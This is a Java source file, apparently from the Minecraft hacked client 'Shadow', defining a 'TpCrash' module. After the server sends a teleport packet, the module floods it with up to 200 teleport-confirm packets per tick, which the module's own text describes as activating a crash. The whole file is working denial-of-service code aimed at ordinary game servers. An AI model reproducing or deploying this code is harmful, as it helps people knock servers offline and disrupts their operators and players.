package net.shadow.feature.module;

import com.mojang.brigadier.suggestion.Suggestion;
import com.mojang.brigadier.suggestion.Suggestions;
import net.minecraft.network.packet.c2s.play.ChatMessageC2SPacket;
import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket;
import net.minecraft.network.packet.c2s.play.TeleportConfirmC2SPacket;
import net.minecraft.network.packet.s2c.play.CommandSuggestionsS2CPacket;
import net.minecraft.network.packet.s2c.play.GameMessageS2CPacket;
import net.minecraft.network.packet.s2c.play.PlayerPositionLookS2CPacket;
import net.shadow.Shadow;
import net.shadow.event.events.PacketInput;
import net.shadow.feature.base.Module;
import net.shadow.feature.base.ModuleType;
import net.shadow.feature.configuration.MultiValue;
import net.shadow.feature.configuration.SliderValue;
import net.shadow.utils.ChatUtils;

import java.util.ArrayList;
import java.util.List;
import java.util.Random;

public class BungeeCrashModule extends Module implements PacketInput {

    boolean crashing = false;
    int secretid = 0;
    final SliderValue power = this.config.create("Power", 1, 1, 200, 0);

    public BungeeCrashModule() {
        super("TpCrash", "teleport to an invalid location to activate crash", ModuleType.CRASH);
    }

    @Override
    public void onEnable() {
       Shadow.getEventSystem().add(PacketInput.class, this);
    }

    @Override
    public void onDisable() {
        Shadow.getEventSystem().remove(PacketInput.class, this);
    }

    @Override
    public void onUpdate() {
        if(crashing){
            for(int i = 0; i < power.getThis(); i++){
                Shadow.c.player.networkHandler.sendPacket(new TeleportConfirmC2SPacket(secretid));
            }
        }

    }

    @Override
    public void onRender() {

    }

    @Override
    public void onReceivedPacket(PacketInputEvent event) {
        if(event.getPacket() instanceof PlayerPositionLookS2CPacket packet){
            crashing = true;
            secretid = packet.getTeleportId();
            ChatUtils.message("Crash activated...");
        }
    }
}
